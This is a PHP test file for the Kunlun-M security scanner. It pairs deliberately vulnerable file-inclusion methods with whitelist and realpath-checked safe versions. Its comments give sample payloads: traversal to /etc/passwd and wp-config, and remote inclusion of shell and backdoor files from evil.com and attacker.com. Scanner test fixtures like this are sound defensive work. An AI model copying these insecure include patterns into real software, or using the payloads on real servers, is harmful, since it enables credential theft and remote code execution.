<?php
/**
 * Real-world Remote File Inclusion (RFI/LFI) test file for Kunlun-M scanner.
 * Simulates a template loading and module inclusion system.
 */

class TemplateController {
    private $templateDir;
    private $moduleDir;

    public function __construct() {
        $this->templateDir = __DIR__ . '/templates/';
        $this->moduleDir   = __DIR__ . '/modules/';
    }

    /**
     * VULN: RFI/LFI via $_GET['page'] in include with directory traversal possible.
     * Attacker can use: ?page=../../../etc/passwd or ?page=http://evil.com/shell.php
     */
    public function renderPage() {
        $page = $_GET['page'] ?? 'home';
        // No sanitization - allows directory traversal and remote inclusion
        $filePath = $this->templateDir . $page . '.php';
        include($filePath);
        // Taint source: $_GET['page'] -> Sink: include() with concatenation
    }

    /**
     * VULN: RFI/LFI via $_POST['module'] in require_once.
     * Attacker can inject: ../../wp-config or http://attacker.com/backdoor.php
     */
    public function loadModule() {
        $module = $_POST['module'] ?? '';
        if (empty($module)) {
            echo "No module specified.";
            return;
        }
        $modulePath = $this->moduleDir . $module . '/index.php';
        require_once($modulePath);
        // Taint source: $_POST['module'] -> Sink: require_once() with concatenation
    }

    /**
     * VULN: RFI/LFI via $_REQUEST['lang'] in include for locale file.
     * Path traversal: ?lang=../../../../etc/passwd%00 (null byte, older PHP)
     */
    public function loadLocale() {
        $lang = $_REQUEST['lang'] ?? 'en_US';
        $localeFile = __DIR__ . '/locales/' . $lang . '.php';
        if (file_exists($localeFile)) {
            include($localeFile);
        } else {
            echo "Locale '{$lang}' not found.";
        }
        // Taint source: $_REQUEST['lang'] -> Sink: include()
    }

    /**
     * SAFE: Whitelist-based template loading.
     */
    public function safeRenderPage() {
        $page = $_GET['page'] ?? 'home';
        $allowedPages = [
            'home', 'about', 'contact', 'dashboard', 'profile',
            'settings', 'help', 'login', 'register', 'search',
        ];

        if (!in_array($page, $allowedPages, true)) {
            http_response_code(404);
            echo "Page not found.";
            return;
        }

        $filePath = $this->templateDir . $page . '.php';
        if (file_exists($filePath)) {
            include($filePath);
        } else {
            echo "Template file missing.";
        }
        // Safe: strict whitelist prevents directory traversal and RFI
    }

    /**
     * SAFE: Using basename() to sanitize filename and realpath() check.
     */
    public function safeLoadModule() {
        $module = $_POST['module'] ?? '';
        if (empty($module)) {
            echo "No module specified.";
            return;
        }

        // Remove directory components
        $safeName = basename($module);
        if ($safeName !== $module) {
            echo "Invalid module name: directory traversal detected.";
            return;
        }

        // Only allow alphanumeric + underscore
        if (!preg_match('/^[a-zA-Z0-9_]+$/', $safeName)) {
            echo "Invalid module name: invalid characters.";
            return;
        }

        $modulePath = realpath($this->moduleDir . $safeName . '/index.php');
        if ($modulePath === false || !str_starts_with($modulePath, realpath($this->moduleDir))) {
            echo "Module not found or outside allowed directory.";
            return;
        }

        require_once($modulePath);
        // Safe: basename + regex + realpath check prevents traversal and RFI
    }
}

// --- Routing ---
if (php_sapi_name() !== 'cli') {
    $controller = new TemplateController();
    $action = $_GET['action'] ?? 'renderPage';
    if (method_exists($controller, $action)) {
        $controller->$action();
    }
}
